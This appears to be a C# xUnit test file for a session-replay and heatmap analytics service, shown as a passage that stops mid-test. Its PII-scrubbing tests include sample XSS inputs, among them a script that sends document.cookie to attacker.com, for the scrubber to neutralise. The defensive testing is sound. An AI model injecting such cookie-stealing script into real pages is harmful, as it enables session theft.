using System.Collections.Concurrent;
using FluentAssertions;
using Microsoft.Extensions.DependencyInjection;
using SGrowing.Api.Modules.Analytics.SessionReplay;
using Xunit;

namespace SGrowing.Tests.Analytics;

/// <summary>
/// Unit and integration-style tests for Phase 32:
/// Real-Time Session Replay, DOM Mutation Vector Journal &amp; UX Heatmap Reconstruction.
/// </summary>
public class SessionReplayAndHeatmapTests
{
    private readonly DomMutationVectorEngine _mutationEngine = new();
    private readonly PiiScrubbingVaultService _scrubber = new();
    private readonly UserInteractionHeatmapService _heatmapService;
    private readonly SessionReplayCoordinator _coordinator;

    public SessionReplayAndHeatmapTests()
    {
        _heatmapService = new UserInteractionHeatmapService(_mutationEngine);
        _coordinator = new SessionReplayCoordinator(_mutationEngine, _heatmapService);
    }

    #region 1. DOM Mutation Ingestion & Monotonic Validation

    [Fact]
    public void IngestMutations_ValidMonotonicSequence_ShouldSucceedAndStoreAllOperations()
    {
        string sessionId = "sess_mono_01";
        var t0 = DateTimeOffset.UtcNow;

        var batch = new DomMutationBatch(
            SessionId: sessionId,
            BatchSequence: 1,
            CreatedAt: t0,
            Mutations:
            [
                new DomMutationOperation(1, 1, t0, MutationType.NodeAdded, "body > div#app", "div"),
                new DomMutationOperation(2, 1, t0.AddMilliseconds(5), MutationType.AttributeModified, "body > div#app", "div", new Dictionary<string, string?> { ["class"] = "active" }),
                new DomMutationOperation(3, 2, t0.AddMilliseconds(12), MutationType.TextContentChanged, "body > div#app > h1", "h1", null, "Welcome User")
            ]);

        var result = _mutationEngine.IngestMutations(sessionId, batch);

        result.Success.Should().BeTrue();
        result.ProcessedCount.Should().Be(3);

        var stored = _mutationEngine.GetSessionMutations(sessionId);
        stored.Should().HaveCount(3);
        stored[0].SequenceNumber.Should().Be(1);
        stored[2].SequenceNumber.Should().Be(3);
    }

    [Fact]
    public void IngestMutations_DuplicateSequenceNumber_ShouldRejectAndReturnFailure()
    {
        string sessionId = "sess_dup_01";
        var t0 = DateTimeOffset.UtcNow;

        var batch1 = new DomMutationBatch(
            sessionId, 1, t0,
            [new DomMutationOperation(1, 1, t0, MutationType.NodeAdded, "body > div", "div")]);

        var batch2 = new DomMutationBatch(
            sessionId, 2, t0.AddMilliseconds(10),
            [new DomMutationOperation(1, 2, t0.AddMilliseconds(10), MutationType.NodeAdded, "body > span", "span")]);

        _mutationEngine.IngestMutations(sessionId, batch1).Success.Should().BeTrue();
        var result = _mutationEngine.IngestMutations(sessionId, batch2);

        result.Success.Should().BeFalse();
        result.Message.Should().Contain("Out-of-order or duplicate sequence number");
    }

    [Fact]
    public void IngestMutations_DecreasingSequenceNumber_ShouldRejectAndReturnFailure()
    {
        string sessionId = "sess_dec_seq_01";
        var t0 = DateTimeOffset.UtcNow;

        var batch = new DomMutationBatch(
            sessionId, 1, t0,
            [
                new DomMutationOperation(5, 1, t0, MutationType.NodeAdded, "body", "body"),
                new DomMutationOperation(4, 2, t0.AddMilliseconds(10), MutationType.NodeAdded, "body > div", "div")
            ]);

        var result = _mutationEngine.IngestMutations(sessionId, batch);

        result.Success.Should().BeFalse();
        result.Message.Should().Contain("Out-of-order or duplicate sequence number");
    }

    [Fact]
    public void IngestMutations_DecreasingFrameIndex_ShouldRejectAndReturnFailure()
    {
        string sessionId = "sess_dec_frame_01";
        var t0 = DateTimeOffset.UtcNow;

        var batch = new DomMutationBatch(
            sessionId, 1, t0,
            [
                new DomMutationOperation(1, 10, t0, MutationType.NodeAdded, "body", "body"),
                new DomMutationOperation(2, 9, t0.AddMilliseconds(5), MutationType.NodeAdded, "body > div", "div")
            ]);

        var result = _mutationEngine.IngestMutations(sessionId, batch);

        result.Success.Should().BeFalse();
        result.Message.Should().Contain("Decreasing frame index");
    }

    [Fact]
    public void IngestMutations_DecreasingTimestamp_ShouldRejectAndReturnFailure()
    {
        string sessionId = "sess_dec_ts_01";
        var t0 = DateTimeOffset.UtcNow;

        var batch = new DomMutationBatch(
            sessionId, 1, t0,
            [
                new DomMutationOperation(1, 1, t0, MutationType.NodeAdded, "body", "body"),
                new DomMutationOperation(2, 2, t0.AddMilliseconds(-50), MutationType.NodeAdded, "body > div", "div")
            ]);

        var result = _mutationEngine.IngestMutations(sessionId, batch);

        result.Success.Should().BeFalse();
        result.Message.Should().Contain("Non-monotonic timestamp");
    }

    [Fact]
    public void IngestMutations_ThrowOnErrorTrue_ShouldThrowInvalidOperationExceptionOnViolation()
    {
        string sessionId = "sess_throw_01";
        var t0 = DateTimeOffset.UtcNow;

        var batch = new DomMutationBatch(
            sessionId, 1, t0,
            [
                new DomMutationOperation(2, 1, t0, MutationType.NodeAdded, "body", "body"),
                new DomMutationOperation(1, 2, t0.AddMilliseconds(5), MutationType.NodeAdded, "body > div", "div")
            ]);

        Action act = () => _mutationEngine.IngestMutations(sessionId, batch, throwOnError: true);

        act.Should().Throw<InvalidOperationException>()
            .WithMessage("*Out-of-order or duplicate sequence number*");
    }

    #endregion

    #region 2. Throughput & Bandwidth Footprint (< 2.0 KB/sec)

    [Fact]
    public void CalculateThroughputMetrics_Under2Kbps_ShouldReportWithinTargetFootprintTrue()
    {
        string sessionId = "sess_bandwidth_under";
        var t0 = DateTimeOffset.UtcNow;

        var batch = new DomMutationBatch(
            SessionId: sessionId,
            BatchSequence: 1,
            CreatedAt: t0,
            Mutations:
            [
                new DomMutationOperation(1, 1, t0, MutationType.NodeAdded, "body > button", "button"),
                new DomMutationOperation(2, 2, t0.AddSeconds(2), MutationType.TextContentChanged, "body > button", "button", null, "Click Me")
            ],
            EstimatedRawBytes: 600,
            CompressedBytes: 150);

        _mutationEngine.IngestMutations(sessionId, batch);
        var metrics = _mutationEngine.CalculateThroughputMetrics(sessionId);

        metrics.BandwidthKbPerSec.Should().BeLessThan(2.0);
        metrics.IsWithinTargetFootprint.Should().BeTrue();
        metrics.TotalCompressedBytes.Should().Be(150);
        metrics.TotalRawBytes.Should().Be(600);
        metrics.CompressionRatio.Should().BeLessThan(1.0);
    }

    [Fact]
    public void CalculateThroughputMetrics_HeavyPayloadExceeding2Kbps_ShouldReportWithinTargetFootprintFalse()
    {
        string sessionId = "sess_bandwidth_heavy";
        var t0 = DateTimeOffset.UtcNow;

        // 10,000 bytes over 1 second = ~9.76 KB/sec
        var batch = new DomMutationBatch(
            SessionId: sessionId,
            BatchSequence: 1,
            CreatedAt: t0,
            Mutations:
            [
                new DomMutationOperation(1, 1, t0, MutationType.NodeAdded, "body > div.heavy", "div"),
                new DomMutationOperation(2, 2, t0.AddSeconds(1), MutationType.TextContentChanged, "body > div.heavy", "div", null, "Massive DOM Payload")
            ],
            EstimatedRawBytes: 25000,
            CompressedBytes: 10240);

        _mutationEngine.IngestMutations(sessionId, batch);
        var metrics = _mutationEngine.CalculateThroughputMetrics(sessionId);

        metrics.BandwidthKbPerSec.Should().BeGreaterThan(2.0);
        metrics.IsWithinTargetFootprint.Should().BeFalse();
    }

    [Fact]
    public void CalculateThroughputMetrics_EmptyOrNonExistentSession_ShouldReturnDefaults()
    {
        var metrics = _mutationEngine.CalculateThroughputMetrics("sess_does_not_exist");

        metrics.TotalMutations.Should().Be(0);
        metrics.TotalRawBytes.Should().Be(0);
        metrics.TotalCompressedBytes.Should().Be(0);
        metrics.IsWithinTargetFootprint.Should().BeTrue();
    }

    [Fact]
    public void CalculateThroughputMetrics_GZipCompressionRatio_ShouldBeLessThanOneForRepetitiveDeltas()
    {
        string sessionId = "sess_gzip_test";
        var t0 = DateTimeOffset.UtcNow;

        var mutations = Enumerable.Range(1, 20)
            .Select(i => new DomMutationOperation(i, i, t0.AddMilliseconds(i * 100), MutationType.AttributeModified, "div.item", "div", new Dictionary<string, string?> { ["style"] = "opacity: 0.5; color: red;" }))
            .ToList();

        var batch = new DomMutationBatch(sessionId, 1, t0, mutations);

        _mutationEngine.IngestMutations(sessionId, batch);
        var metrics = _mutationEngine.CalculateThroughputMetrics(sessionId);

        metrics.TotalRawBytes.Should().BeGreaterThan(0);
        metrics.TotalCompressedBytes.Should().BeGreaterThan(0);
        metrics.CompressionRatio.Should().BeLessThan(1.0);
    }

    #endregion

    #region 3. PII Scrubbing Vault Service

    [Theory]
    [InlineData("378282246310005", "**** **** **** 0005")]
    [InlineData("4532 0151 1283 0366", "**** **** **** 0366")]
    [InlineData("4532-0151-1283-0366", "**** **** **** 0366")]
    public void ScrubTextPayload_ValidLuhnCreditCard_ShouldMaskPreservingLast4Digits(string rawCard, string expectedMask)
    {
        string text = $"User submitted payment card: {rawCard} at checkout.";
        string scrubbed = _scrubber.ScrubTextPayload(text);

        scrubbed.Should().Contain(expectedMask);
        scrubbed.Should().NotContain(rawCard);
    }

    [Fact]
    public void ScrubTextPayload_InvalidLuhnNumber_ShouldNotMaskAsCreditCard()
    {
        // 16-digit sequence that fails Luhn formula
        string invalidCard = "4532148812345678";
        string text = $"Account serial: {invalidCard}";

        string scrubbed = _scrubber.ScrubTextPayload(text);

        scrubbed.Should().Contain(invalidCard);
        scrubbed.Should().NotContain("**** **** ****");
    }

    [Theory]
    [InlineData("100234567890123456", "NIN-****-3456")]
    [InlineData("NIN 100234567890129876", "NIN-****-9876")]
    public void ScrubTextPayload_AlgerianNIN18Digits_ShouldMaskToNinFormat(string rawNin, string expectedMask)
    {
        string text = $"Citizen NIN identification: {rawNin} verified.";
        string scrubbed = _scrubber.ScrubTextPayload(text);

        scrubbed.Should().Contain(expectedMask);
    }

    [Theory]
    [InlineData("karim.belkacem@sgrowing.dz", "k***@sgrowing.dz")]
    [InlineData("user@company.com", "u***@company.com")]
    [InlineData("info@domain.algeria.org", "i***@domain.algeria.org")]
    public void ScrubTextPayload_EmailAddress_ShouldMaskUsernamePreservingInitialAndDomain(string email, string expectedMask)
    {
        string text = $"Please contact {email} for billing updates.";
        string scrubbed = _scrubber.ScrubTextPayload(text);

        scrubbed.Should().Contain(expectedMask);
        scrubbed.Should().NotContain(email);
    }

    [Theory]
    [InlineData("+213 555 12 34 89", "+213 *** *** 89")]
    [InlineData("0770 12 34 89", "+213 *** *** 89")]
    [InlineData("+1 415 555 2689", "+213 *** *** 89")]
    public void ScrubTextPayload_PhoneNumbers_ShouldMaskPreservingPrefixAndLastDigits(string phone, string expectedMask)
    {
        string text = $"Support dialer reached {phone} directly.";
        string scrubbed = _scrubber.ScrubTextPayload(text);

        scrubbed.Should().Contain(expectedMask);
    }

    [Fact]
    public void ScrubTextPayload_PasswordAndSecretKeyValue_ShouldMaskWithDots()
    {
        string text = "Session config: password=SuperSecret123; token: eyJhbGciOiJIUzI1NiJ9; cvv=987";
        string scrubbed = _scrubber.ScrubTextPayload(text);

        scrubbed.Should().Contain("password=••••••••");
        scrubbed.Should().Contain("token: ••••••••");
        scrubbed.Should().Contain("cvv=••••••••");
        scrubbed.Should().NotContain("SuperSecret123");
        scrubbed.Should().NotContain("eyJhbGciOiJIUzI1NiJ9");
    }

    [Fact]
    public void ScrubTextPayload_ScriptTag_ShouldStripExecutableScriptTags()
    {
        string text = "Header <script>alert('XSS Exploit!');</script> Content";
        string scrubbed = _scrubber.ScrubTextPayload(text);

        scrubbed.Should().Be("Header  Content");
        scrubbed.Should().NotContain("alert");
    }

    [Theory]
    [InlineData("user_password", null, true)]
    [InlineData("cvv2", null, true)]
    [InlineData("auth_token", null, true)]
    [InlineData("txtPinCode", null, true)]
    [InlineData("randomInput", "password", true)]
    [InlineData("firstName", "text", false)]
    [InlineData("city", null, false)]
    public void IsSensitiveField_PasswordOrSecretNames_ShouldReturnTrue(string fieldName, string? inputType, bool expected)
    {
        _scrubber.IsSensitiveField(fieldName, inputType).Should().Be(expected);
    }

    [Fact]
    public void ScrubMutationBatch_EventHandlersAndJavascriptUrls_ShouldBeStrippedOrNeutralized()
    {
        var batch = new DomMutationBatch(
            SessionId: "sess_xss_test",
            BatchSequence: 1,
            CreatedAt: DateTimeOffset.UtcNow,
            Mutations:
            [
                new DomMutationOperation(
                    SequenceNumber: 1,
                    FrameIndex: 1,
                    Timestamp: DateTimeOffset.UtcNow,
                    Type: MutationType.AttributeModified,
                    TargetNodePath: "body > a.link",
                    TagName: "a",
                    AttributeDeltas: new Dictionary<string, string?>
                    {
                        ["href"] = "javascript:stealCookies()",
                        ["onclick"] = "doEvil()",
                        ["onerror"] = "handleFail()",
                        ["title"] = "Contact user@domain.com"
                    }),
                new DomMutationOperation(
                    SequenceNumber: 2,
                    FrameIndex: 2,
                    Timestamp: DateTimeOffset.UtcNow.AddMilliseconds(5),
                    Type: MutationType.NodeAdded,
                    TargetNodePath: "body > script",
                    TagName: "script",
                    TextContentDelta: "fetch('//attacker.com?c=' + document.cookie)")
            ]);

        var scrubbed = _scrubber.ScrubMutationBatch(batch);

        var firstAttrs = scrubbed.Mutations[0].AttributeDeltas!;
        firstAttrs.Should().NotContainKey("onclick");
        firstAttrs.Should().NotContainKey("onerror");
        firstAttrs["href"].Should().Be("about:blank");
        firstAttrs["title"].Should().Be("Contact u***@domain.com");

        var secondMutation = scrubbed.Mutations[1];
        secondMutation.TextContentDelta.Should().Contain("[SCRUBBED EXECUTABLE SCRIPT]");
        secondMutation.AttributeDeltas!["type"].Should().Be("text/plain");
    }

    #endregion

    #region 4. Micro-Frustration Detection (Rage Clicks, Dead Clicks, Scroll Thrashing)

    [Fact]
    public void DetectFrustrations_RageClicks_ThreeClicksWithin500msInRadius_ShouldTriggerRageClick()
    {
        string sessionId = "sess_rage_01";
        var t0 = DateTimeOffset.UtcNow;

        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Click, 100.0, 200.0, 1920, 1080, 0, "btn-submit", t0),
            new(2, InteractionType.Click, 105.0, 202.0, 1920, 1080, 0, "btn-submit", t0.AddMilliseconds(150)),
            new(3, InteractionType.Click, 102.0, 198.0, 1920, 1080, 0, "btn-submit", t0.AddMilliseconds(350))
        };

        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com/cart", events);
        var frustrations = _heatmapService.DetectFrustrations(sessionId);

        frustrations.Should().ContainSingle(f => f.Type == FrustrationType.RageClick);
        var rage = frustrations.First(f => f.Type == FrustrationType.RageClick);
        rage.OccurrenceCount.Should().Be(3);
        rage.ElementSelector.Should().Be("btn-submit");
        rage.Description.Should().Contain("3 rapid clicks");
    }

    [Fact]
    public void DetectFrustrations_RageClicks_SpreadOverMoreThan500ms_ShouldNotTriggerRageClick()
    {
        string sessionId = "sess_rage_slow";
        var t0 = DateTimeOffset.UtcNow;

        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Click, 100.0, 200.0, 1920, 1080, 0, "btn-submit", t0),
            new(2, InteractionType.Click, 100.0, 200.0, 1920, 1080, 0, "btn-submit", t0.AddMilliseconds(600)),
            new(3, InteractionType.Click, 100.0, 200.0, 1920, 1080, 0, "btn-submit", t0.AddMilliseconds(1200))
        };

        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com/cart", events);
        var frustrations = _heatmapService.DetectFrustrations(sessionId);

        frustrations.Should().NotContain(f => f.Type == FrustrationType.RageClick);
    }

    [Fact]
    public void DetectFrustrations_RageClicks_ClicksFurtherThan25pxApart_ShouldNotTriggerRageClick()
    {
        string sessionId = "sess_rage_far";
        var t0 = DateTimeOffset.UtcNow;

        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Click, 100.0, 100.0, 1920, 1080, 0, null, t0),
            new(2, InteractionType.Click, 150.0, 150.0, 1920, 1080, 0, null, t0.AddMilliseconds(100)),
            new(3, InteractionType.Click, 200.0, 200.0, 1920, 1080, 0, null, t0.AddMilliseconds(200))
        };

        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com/explore", events);
        var frustrations = _heatmapService.DetectFrustrations(sessionId);

        frustrations.Should().NotContain(f => f.Type == FrustrationType.RageClick);
    }

    [Fact]
    public void DetectFrustrations_RageClicks_SameSelectorEvenIfCoordinatesVary_ShouldTriggerRageClick()
    {
        string sessionId = "sess_rage_selector";
        var t0 = DateTimeOffset.UtcNow;

        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Click, 10.0, 10.0, 1920, 1080, 0, "#checkout-btn", t0),
            new(2, InteractionType.Click, 70.0, 70.0, 1920, 1080, 0, "#checkout-btn", t0.AddMilliseconds(120)),
            new(3, InteractionType.Click, 40.0, 30.0, 1920, 1080, 0, "#checkout-btn", t0.AddMilliseconds(280))
        };

        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com/checkout", events);
        var frustrations = _heatmapService.DetectFrustrations(sessionId);

        frustrations.Should().ContainSingle(f => f.Type == FrustrationType.RageClick);
    }

    [Fact]
    public void DetectFrustrations_DeadClicks_InteractiveButtonWithNoDomResponse_ShouldTriggerDeadClick()
    {
        string sessionId = "sess_dead_01";
        var t0 = DateTimeOffset.UtcNow;

        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Click, 250.0, 300.0, 1920, 1080, 0, "button.submit-order", t0)
        };

        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com/order", events);
        // Notice: zero DOM mutations ingested for sess_dead_01!

        var frustrations = _heatmapService.DetectFrustrations(sessionId);

        frustrations.Should().ContainSingle(f => f.Type == FrustrationType.DeadClick);
        var dead = frustrations.First(f => f.Type == FrustrationType.DeadClick);
        dead.ElementSelector.Should().Be("button.submit-order");
        dead.Description.Should().Contain("zero DOM response within 1000ms");
    }

    [Fact]
    public void DetectFrustrations_DeadClicks_InteractiveButtonWithDomResponseWithin1000ms_ShouldNotTriggerDeadClick()
    {
        string sessionId = "sess_alive_01";
        var t0 = DateTimeOffset.UtcNow;

        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Click, 250.0, 300.0, 1920, 1080, 0, "button.submit-order", t0)
        };

        // DOM mutation responds 200ms after click!
        var batch = new DomMutationBatch(
            SessionId: sessionId,
            BatchSequence: 1,
            CreatedAt: t0,
            Mutations:
            [
                new DomMutationOperation(1, 1, t0.AddMilliseconds(200), MutationType.AttributeModified, "button.submit-order", "button", new Dictionary<string, string?> { ["disabled"] = "true" })
            ]);

        _mutationEngine.IngestMutations(sessionId, batch);
        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com/order", events);

        var frustrations = _heatmapService.DetectFrustrations(sessionId);

        frustrations.Should().NotContain(f => f.Type == FrustrationType.DeadClick);
    }

    [Fact]
    public void DetectFrustrations_DeadClicks_NonInteractiveElement_ShouldNotTriggerDeadClick()
    {
        string sessionId = "sess_non_interactive";
        var t0 = DateTimeOffset.UtcNow;

        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Click, 50.0, 50.0, 1920, 1080, 0, "div.background-banner", t0)
        };

        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com/home", events);
        var frustrations = _heatmapService.DetectFrustrations(sessionId);

        frustrations.Should().NotContain(f => f.Type == FrustrationType.DeadClick);
    }

    [Fact]
    public void DetectFrustrations_ScrollThrashing_FourOscillationsWithinTwoSeconds_ShouldTriggerScrollThrashing()
    {
        string sessionId = "sess_thrash_01";
        var t0 = DateTimeOffset.UtcNow;

        // Down -> Up -> Down -> Up -> Down within 1.5 seconds
        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Scroll, 0, 0, 1920, 1080, 100.0, null, t0),
            new(2, InteractionType.Scroll, 0, 0, 1920, 1080, 350.0, null, t0.AddMilliseconds(200)), // Down (+1)
            new(3, InteractionType.Scroll, 0, 0, 1920, 1080, 120.0, null, t0.AddMilliseconds(400)), // Up (-1) -> Rev 1
            new(4, InteractionType.Scroll, 0, 0, 1920, 1080, 400.0, null, t0.AddMilliseconds(700)), // Down (+1) -> Rev 2
            new(5, InteractionType.Scroll, 0, 0, 1920, 1080, 150.0, null, t0.AddMilliseconds(1000)), // Up (-1) -> Rev 3
            new(6, InteractionType.Scroll, 0, 0, 1920, 1080, 500.0, null, t0.AddMilliseconds(1300))  // Down (+1) -> Rev 4
        };

        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com/feed", events);
        var frustrations = _heatmapService.DetectFrustrations(sessionId);

        frustrations.Should().ContainSingle(f => f.Type == FrustrationType.ScrollThrashing);
        var thrash = frustrations.First(f => f.Type == FrustrationType.ScrollThrashing);
        thrash.OccurrenceCount.Should().Be(4);
        thrash.Description.Should().Contain("Scroll thrashing detected");
    }

    [Fact]
    public void DetectFrustrations_ScrollThrashing_SlowScrolling_ShouldNotTriggerScrollThrashing()
    {
        string sessionId = "sess_thrash_slow";
        var t0 = DateTimeOffset.UtcNow;

        // Oscillations separated by 5 seconds
        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Scroll, 0, 0, 1920, 1080, 100.0, null, t0),
            new(2, InteractionType.Scroll, 0, 0, 1920, 1080, 300.0, null, t0.AddSeconds(1)),
            new(3, InteractionType.Scroll, 0, 0, 1920, 1080, 100.0, null, t0.AddSeconds(4)),
            new(4, InteractionType.Scroll, 0, 0, 1920, 1080, 400.0, null, t0.AddSeconds(7)),
            new(5, InteractionType.Scroll, 0, 0, 1920, 1080, 100.0, null, t0.AddSeconds(10)),
            new(6, InteractionType.Scroll, 0, 0, 1920, 1080, 500.0, null, t0.AddSeconds(13))
        };

        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com/feed", events);
        var frustrations = _heatmapService.DetectFrustrations(sessionId);

        frustrations.Should().NotContain(f => f.Type == FrustrationType.ScrollThrashing);
    }

    #endregion

    #region 5. Spatial 2D Density Heatmap Aggregation

    [Fact]
    public void GetHeatmap_ClickHeatmap_ShouldAggregateClicksIntoCorrectGridCellsAndNormalizeIntensity()
    {
        string pageUrl = "https://sgrowing.com/landing";
        var t0 = DateTimeOffset.UtcNow;

        // 3 clicks in top-left bucket (100, 100), 1 click in center (960, 540) on 1920x1080 viewport
        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Click, 100.0, 100.0, 1920, 1080, 0, null, t0),
            new(2, InteractionType.Click, 102.0, 104.0, 1920, 1080, 0, null, t0.AddSeconds(1)),
            new(3, InteractionType.Click, 98.0, 99.0, 1920, 1080, 0, null, t0.AddSeconds(2)),
            new(4, InteractionType.Click, 960.0, 540.0, 1920, 1080, 0, null, t0.AddSeconds(3))
        };

        _heatmapService.IngestInteractions("sess_heat_01", pageUrl, events);
        var heatmap = _heatmapService.GetHeatmap(pageUrl, HeatmapType.Click, gridWidth: 50, gridHeight: 50);

        heatmap.TotalInteractions.Should().Be(4);
        heatmap.MaxCount.Should().Be(3);
        heatmap.Cells.Should().NotBeEmpty();

        var topCell = heatmap.Cells.OrderByDescending(c => c.Count).First();
        topCell.Count.Should().Be(3);
        topCell.Intensity.Should().Be(1.0); // 3 / 3 = 1.0

        var centerCell = heatmap.Cells.First(c => c.Count == 1);
        centerCell.Intensity.Should().BeApproximately(1.0 / 3.0, 0.01);
    }

    [Fact]
    public void GetHeatmap_MoveHeatmap_ShouldFilterPointerMovesAndComputeNormalizedGridCoordinates()
    {
        string pageUrl = "https://sgrowing.com/dashboard";
        var t0 = DateTimeOffset.UtcNow;

        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.PointerMove, 500.0, 500.0, 1920, 1080, 0, null, t0),
            new(2, InteractionType.PointerMove, 510.0, 505.0, 1920, 1080, 0, null, t0.AddMilliseconds(100)),
            new(3, InteractionType.Click, 100.0, 100.0, 1920, 1080, 0, null, t0.AddMilliseconds(200)) // should be filtered out
        };

        _heatmapService.IngestInteractions("sess_heat_02", pageUrl, events);
        var heatmap = _heatmapService.GetHeatmap(pageUrl, HeatmapType.Move, gridWidth: 50, gridHeight: 50);

        heatmap.TotalInteractions.Should().Be(2);
        heatmap.Type.Should().Be(HeatmapType.Move);
        heatmap.Cells.All(c => c.NormalizedX >= 0.0 && c.NormalizedX <= 1.0).Should().BeTrue();
        heatmap.Cells.All(c => c.NormalizedY >= 0.0 && c.NormalizedY <= 1.0).Should().BeTrue();
    }

    [Fact]
    public void GetHeatmap_NoInteractionsForPage_ShouldReturnEmptyHeatmapResult()
    {
        var heatmap = _heatmapService.GetHeatmap("https://sgrowing.com/unknown", HeatmapType.Click);

        heatmap.TotalInteractions.Should().Be(0);
        heatmap.MaxCount.Should().Be(0);
        heatmap.Cells.Should().BeEmpty();
    }

    [Fact]
    public void GetHeatmap_CustomGridSize_ShouldRespectCustomWidthAndHeight()
    {
        string pageUrl = "https://sgrowing.com/custom-grid";
        var events = new List<InteractionEvent>
        {
            new(1, InteractionType.Click, 400.0, 300.0, 1000, 1000, 0, null, DateTimeOffset.UtcNow)
        };

        _heatmapService.IngestInteractions("sess_custom_grid", pageUrl, events);
        var heatmap = _heatmapService.GetHeatmap(pageUrl, HeatmapType.Click, gridWidth: 20, gridHeight: 20);

        heatmap.GridWidth.Should().Be(20);
        heatmap.GridHeight.Should().Be(20);
        heatmap.Cells.Should().HaveCount(1);
        heatmap.Cells[0].GridX.Should().Be(8); // 400 / 1000 * 20 = 8
        heatmap.Cells[0].GridY.Should().Be(6); // 300 / 1000 * 20 = 6
    }

    #endregion

    #region 6. Session Replay Coordinator & Timeline Reassembly

    [Fact]
    public void StartSession_ShouldInitializeRecordingMetadata()
    {
        var req = new SessionStartRequest(
            SessionId: "sess_start_01",
            TenantId: "tenant-dz-01",
            UserId: "usr-456",
            Device: "Mobile",
            Browser: "Safari",
            OperatingSystem: "iOS",
            InitialPageUrl: "https://sgrowing.com/products/algeria-flag");

        var meta = _coordinator.StartSession(req);

        meta.SessionId.Should().Be("sess_start_01");
        meta.TenantId.Should().Be("tenant-dz-01");
        meta.UserId.Should().Be("usr-456");
        meta.Status.Should().Be(SessionStatus.Recording);
        meta.Device.Should().Be("Mobile");
        meta.Browser.Should().Be("Safari");
        meta.EndTime.Should().BeNull();
        meta.TotalEvents.Should().Be(0);
    }

    [Fact]
    public void CompleteSession_ShouldTransitionToCompletedAndAggregateTotalEvents()
    {
        string sessionId = "sess_complete_01";
        var t0 = DateTimeOffset.UtcNow;

        _coordinator.StartSession(new SessionStartRequest(sessionId, "tenant-1"));

        var batch = new DomMutationBatch(sessionId, 1, t0,
            [new DomMutationOperation(1, 1, t0, MutationType.NodeAdded, "body", "body")]);
        _mutationEngine.IngestMutations(sessionId, batch);

        var interactions = new List<InteractionEvent>
        {
            new(1, InteractionType.PointerMove, 50, 50, 1920, 1080, 0, null, t0.AddMilliseconds(50))
        };
        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com", interactions);

        var completed = _coordinator.CompleteSession(sessionId);

        completed.Status.Should().Be(SessionStatus.Completed);
        completed.EndTime.Should().NotBeNull();
        completed.TotalEvents.Should().Be(2); // 1 mutation + 1 interaction
    }

    [Fact]
    public void GetReplayTimeline_ChronologicalOrdering_ShouldMergeMutationsInteractionsAndFrustrations()
    {
        string sessionId = "sess_stream_merge";
        var t0 = DateTimeOffset.UtcNow;

        _coordinator.StartSession(new SessionStartRequest(sessionId, "tenant-1"));

        // Frame 1: DomMutation at t0
        _mutationEngine.IngestMutations(sessionId, new DomMutationBatch(sessionId, 1, t0,
            [new DomMutationOperation(1, 1, t0, MutationType.NodeAdded, "body", "body")]));

        // Frame 2: Interaction at t0 + 200ms
        _heatmapService.IngestInteractions(sessionId, "https://sgrowing.com",
            [new InteractionEvent(1, InteractionType.PointerMove, 300, 400, 1920, 1080, 0, null, t0.AddMilliseconds(200))]);

        // Frame 3: DomMutation at t0 + 500ms
        _mutationEngine.IngestMutations(sessionId, new DomMutationBatch(sessionId, 2, t0.AddMilliseconds(500),
            [new DomMutationOperation(2, 2, t0.AddMilliseconds(500), MutationType.ViewportResized, null, null, null, null, null, 1440, 900)]));

        var timeline = _coordinator.GetReplayTimeline(sessionId);

        timeline.Frames.Should().HaveCount(3);
        timeline.Frames[0].EventType.Should().Be(TimelineEventType.DomMutation);
        timeline.Frames[0].OffsetMilliseconds.Should().Be(0.0);

        timeline.Frames[1].EventType.Should().Be(TimelineEventType.UserInteraction);
        timeline.Frames[1].OffsetMilliseconds.Should().BeApproximately(200.0, 1.0);

        timeline.Frames[2].EventType.Should().Be(TimelineEventType.ViewportResize);
        timeline.Frames[2].OffsetMilliseconds.Should().BeApproximately(500.0, 1.0);
    }

    [Fact]
    public void GetReplayTimeline_PlaybackSpeedScaling_ShouldScaleScaledDurationMsAccurately()
    {
        string sessionId = "sess_speed_scale";
        var t0 = DateTimeOffset.UtcNow;

        _coordinator.StartSession(new SessionStartRequest(sessionId, "tenant-1"));

        _mutationEngine.IngestMutations(sessionId, new DomMutationBatch(sessionId, 1, t0,
            [
                new DomMutationOperation(1, 1, t0, MutationType.NodeAdded, "body", "body"),
                new DomMutationOperation(2, 2, t0.AddSeconds(10), MutationType.NodeRemoved, "body > div", "div")
            ]));

        var timeline1x = _coordinator.GetReplayTimeline(sessionId, playbackSpeed: 1.0);
        var timeline2x = _coordinator.GetReplayTimeline(sessionId, playbackSpeed: 2.0);
        var timeline4x = _coordinator.GetReplayTimeline(sessionId, playbackSpeed: 4.0);

        timeline1x.OriginalDurationMs.Should().BeApproximately(10000.0, 10.0);
        timeline1x.ScaledDurationMs.Should().BeApproximately(10000.0, 10.0);
        timeline2x.ScaledDurationMs.Should().BeApproximately(5000.0, 10.0);
        timeline4x.ScaledDurationMs.Should().BeApproximately(2500.0, 10.0);
    }

    [Fact]
    public void SeekToOffset_BinarySearch_ShouldLocateClosestTimelineFrameAccurately()
    {
        string sessionId = "sess_seek_test";
        var t0 = DateTimeOffset.UtcNow;

        _coordinator.StartSession(new SessionStartRequest(sessionId, "tenant-1"));

        var mutations = Enumerable.Range(1, 10)
            .Select(i => new DomMutationOperation(i, i, t0.AddMilliseconds(i * 1000), MutationType.TextContentChanged, "div", "div", null, $"Update {i}"))
            .ToList();

        _mutationEngine.IngestMutations(sessionId, new DomMutationBatch(sessionId, 1, t0, mutations));
        var timeline = _coordinator.GetReplayTimeline(sessionId);

